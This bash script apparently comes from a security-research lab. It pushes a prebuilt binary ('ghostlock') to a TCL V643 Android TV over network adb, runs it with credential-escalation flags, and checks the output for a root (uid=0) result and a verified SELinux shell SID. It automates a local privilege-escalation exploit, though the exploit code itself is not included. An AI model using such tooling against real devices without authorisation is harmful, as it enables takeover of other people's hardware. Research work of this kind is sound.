#!/bin/bash
set -u

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
BUILD="$ROOT/build/android34"
ADB_TARGET=${ADB_TARGET:-192.168.1.132:5555}
ADB_VENDOR_KEYS=${ADB_VENDOR_KEYS:-/home/mint/.android/adbkey}
export ADB_VENDOR_KEYS

probe_name=ghostlock-v643-sid-probe
helper_name=tcl-v643-mcast-helper-sid-probe

adb -s "$ADB_TARGET" get-state
adb -s "$ADB_TARGET" push "$BUILD/ghostlock-tcl-v643-lab" \
  "/data/local/tmp/$probe_name"
adb -s "$ADB_TARGET" push "$BUILD/tcl-v643-mcast-helper" \
  "/data/local/tmp/$helper_name"
adb -s "$ADB_TARGET" shell chmod 755 \
  "/data/local/tmp/$probe_name" "/data/local/tmp/$helper_name"

before_boot=$(adb -s "$ADB_TARGET" shell \
  cat /proc/sys/kernel/random/boot_id | tr -d '\r')
printf 'TV_SID_PROBE before_boot=%s\n' "$before_boot"
sha256sum "$BUILD/ghostlock-tcl-v643-lab" \
  "$BUILD/tcl-v643-mcast-helper"

set +e
probe_output=$(adb -s "$ADB_TARGET" shell \
  "cd /data/local/tmp && timeout 600 env \
TCL_PERF_WITNESS=1 \
TCL_PERF_WITNESS_ATTEMPTS=5 \
TCL_PERF_RING_LOOPS=20000 \
TCL_MCAST_HELPER=/data/local/tmp/$helper_name \
GHOST_SELINUX=0 GHOST_EXEC=0 GHOST_REBOOT=0 GHOST_MINIMAL=1 \
GHOST_SID_DEFAULT=1374 GHOST_SID_SCAN=0 GHOST_NS_TUNE=0 \
FOPS_MAX_ATTEMPTS=1 CRED_ATTEMPTS=1 KSNITCH_VERBOSE=0 \
./$probe_name --cred" 2>&1)
probe_rc=$?
set -e
printf '%s\n' "$probe_output"
printf 'TV_SID_PROBE command_rc=%d\n' "$probe_rc"

after_boot=$(adb -s "$ADB_TARGET" shell \
  cat /proc/sys/kernel/random/boot_id | tr -d '\r')
printf 'TV_SID_PROBE after_boot=%s\n' "$after_boot"
adb -s "$ADB_TARGET" shell \
  "getprop ro.boot.verifiedbootstate; getprop ro.boot.vbmeta.device_state; \
getprop ro.boot.veritymode; getenforce; \
ps -A | grep -E 'ghostlock|mcast-helper' || true"

test "$before_boot" = "$after_boot"
printf '%s\n' "$probe_output" | grep -Eq \
  'TCL capture witness: method=perf-regs .*block=[0-9]+ pfn_reference=-1 verdict=1'
printf '%s\n' "$probe_output" | grep -q '=== ROOT: uid=0 hits=1/1 ==='

if printf '%s\n' "$probe_output" | \
    grep -q 'sid: EARLY CANDIDATE 1374 VERIFIED probe=0 ctx=u:r:shell:s0'; then
  printf '%s\n' "$probe_output" | grep -q 'file_create=OK'
  printf 'TV_SID_PROBE PASS: SID 1374 verified as shell on V643\n'
else
  printf 'TV_SID_PROBE NO_MATCH: UID 0 landed but SID 1374 was not verified\n' >&2
  exit 2
fi
